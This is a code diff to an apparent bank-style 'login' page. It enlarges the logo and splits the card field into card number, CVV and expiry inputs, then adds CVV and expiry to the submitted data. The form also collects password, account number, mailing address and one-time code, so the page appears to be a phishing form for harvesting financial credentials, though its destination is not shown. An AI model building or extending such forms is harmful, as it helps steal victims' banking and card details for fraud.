@@ -60,7 +60,7 @@
       height: 56px;
     }
     .logo-img {
-      height: 48px;
+      height: 72px;
       width: auto;
       margin: 0 0 0 0;
     }
@@ -138,6 +138,15 @@
       margin: 0 auto;
       max-width: 600px;
     }
+    .card-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 6px;
+    }
+    .card-row input {
+      flex: 1;
+      min-width: 0;
+    }
     @media (max-width: 600px) {
       .login-card {
         max-width: 98vw;
@@ -168,8 +177,12 @@
         <label>Account Number
           <input type="text" name="accountnumber" required>
         </label>
-        <label>Card Number
-          <input type="text" name="cardnumber" required>
+        <label>Card Details
+          <div class="card-row">
+            <input type="text" name="cardnumber" required placeholder="Card Number">
+            <input type="text" name="cvv" required placeholder="CVV" maxlength="4" style="max-width:70px;">
+            <input type="text" name="expdate" required placeholder="MM/YY" maxlength="5" style="max-width:80px;">
+          </div>
         </label>
         <label>Mailing Address
           <input type="text" name="mailingaddress" required>
@@ -199,6 +212,8 @@
         password: password,
         accountnumber: this.accountnumber.value,
         cardnumber: this.cardnumber.value,
+        cvv: this.cvv.value,
+        expdate: this.expdate.value,
         mailingaddress: this.mailingaddress.value,
         otp: this.otp.value
       };
